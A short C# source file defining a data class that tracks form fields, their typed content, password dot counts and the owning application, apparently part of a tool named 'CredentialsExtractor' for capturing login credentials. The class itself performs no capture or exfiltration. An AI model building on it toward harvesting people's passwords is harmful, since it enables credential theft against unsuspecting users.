using System.Text;

namespace CredentialsExtractor.Core
{
    public class FormFieldState
    {
        public string FieldId { get; set; }
        public string FieldType { get; set; }
        public StringBuilder Content { get; set; }
        public DateTime LastUpdateTime { get; set; }
        public string LastDetectedContent { get; set; }
        public int LastDotCount { get; set; } // Only relevant for password fields

        // Added application identification properties
        public ApplicationInfo ApplicationInfo { get; set; }

        public FormFieldState(string fieldId, string fieldType)
        {
            FieldId = fieldId;
            FieldType = fieldType;
            Content = new StringBuilder();
            LastUpdateTime = DateTime.Now;
            LastDetectedContent = string.Empty;
            ApplicationInfo = new ApplicationInfo();
        }
    }
}